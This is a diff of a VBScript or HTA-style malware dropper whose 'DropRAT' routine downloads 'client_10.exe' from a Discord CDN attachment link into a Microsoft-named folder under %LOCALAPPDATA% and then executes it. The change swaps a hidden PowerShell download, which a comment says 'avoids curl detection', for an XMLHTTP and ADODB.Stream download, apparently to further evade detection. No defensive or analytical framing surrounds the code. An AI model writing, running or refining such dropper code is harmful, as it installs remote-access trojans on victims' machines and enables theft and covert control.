@@ -43,9 +43,8 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Standard Download to Disk + Execute) ---
+' --- RAT DROP (XMLHTTP Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
-    ' Updated RAT Link
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572764410202693664/client_10.exe?ex=6aff8e7f&is=6afe3cff&hm=8cecb094312df98931f68499bcc7013bf7c20990176268e7887e512d1301da39&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
@@ -59,9 +58,19 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' 2. Download file via PowerShell (avoids curl detection)
-    Dim psCmd : psCmd = "powershell -NoP -Exec Bypass -Command ""(New-Object Net.WebClient).DownloadFile('" & dl & "', '" & op & "')"""
-    sh.Run psCmd, 0, True
+    ' 2. Download file directly into memory and write to disk via XMLHTTP
+    Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP")
+    xh.Open "GET", dl, False
+    xh.Send
+
+    If xh.Status = 200 Then
+        Dim stream : Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write xh.ResponseBody
+        stream.SaveToFile op, 2
+        stream.Close
+    End If
 
     ' 3. Execute the file normally
     If fso.FileExists(op) Then
